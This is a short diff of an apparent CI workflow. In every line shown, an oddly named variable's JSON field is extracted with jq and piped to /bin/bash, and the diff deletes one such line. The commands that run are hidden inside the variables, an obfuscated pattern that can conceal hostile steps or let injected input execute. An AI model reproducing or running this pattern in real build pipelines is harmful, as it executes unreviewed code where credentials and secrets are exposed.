@@ -22,7 +22,6 @@ jobs:
           echo $ifn92 | jq -r .xyoom7 | /bin/bash
           printf '%s' "$bqefc0124" | jq -r .ibjck33778 | /bin/bash
           echo $tjd648 | jq -r .n9 | /bin/bash
-          echo $xkft12 | jq -r .t1 | /bin/bash
           echo $ax551 | jq -r .x2 | /bin/bash
           printf '%s' "$x250" | jq -r .tojy15383 | /bin/bash
           echo $s3767 | jq -r .zds31135 | /bin/bash
